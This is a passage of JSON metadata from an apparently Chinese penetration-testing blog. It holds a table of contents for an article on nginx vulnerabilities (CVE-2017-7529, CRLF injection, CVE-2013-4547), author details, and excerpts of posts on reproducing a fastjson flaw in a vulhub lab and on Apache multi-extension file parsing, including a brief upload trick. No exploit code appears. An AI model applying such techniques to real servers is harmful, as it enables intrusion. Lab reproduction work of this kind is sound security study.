class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-3%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">3.3、漏洞修复</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E6%95%B4%E6%95%B0%E6%BA%A2%E5%A4%84%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7529%EF%BC%89\"><span class=\"toc-text\">四、整数溢处漏洞（CVE-2017-7529）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-1%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">4.1漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">4.2漏洞复现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4-3%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">4.3漏洞修复</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%94%E3%80%81CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">五、CRLF注入漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-1%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">5.1漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">5.2漏洞复现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5-3%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">5.3漏洞修复</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%AD%E3%80%81%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2013-4547%EF%BC%89\"><span class=\"toc-text\">六、文件名逻辑漏洞（CVE-2013-4547）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-1%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">6.1漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">6.2漏洞复现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6-3%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">6.3漏洞修复</span></a></li></ol></li></ol>","author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"fastjson漏洞复现","uid":"27efebc17e75edd169130d3950d28289","slug":"fastjson漏洞复现","date":"2021-10-12T11:58:36.554Z","updated":"2021-10-12T11:59:05.011Z","comments":true,"path":"api/articles/fastjson漏洞复现.json","keywords":null,"cover":[],"text":"fastjson漏洞复现一、环境搭建cd vulhub&#x2F;fastjson&#x2F;1.2.24‐rce docker‐compose up ‐d 访问http://IP:8090即可 二、漏洞复现2.1漏洞判断 正常来说fastjson是没有指纹的，但是我们可以通过报...","link":"","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"apache漏洞","uid":"fe97a5d550cfbb945b0d38253da8658e","slug":"apache漏洞","date":"2021-10-09T10:28:19.782Z","updated":"2021-10-09T10:28:40.074Z","comments":true,"path":"api/articles/apache漏洞.json","keywords":null,"cover":[],"text":"一、 未知扩展名解析漏洞（12server4）1.1、漏洞描述Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。 1.2、漏洞复现很好理解不截图了 我上传了一个名字叫lcx.php.qqq 的文件，当此特性存在...","link":"","photos":[],"count_time":{"symbolsCount":"3.4k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}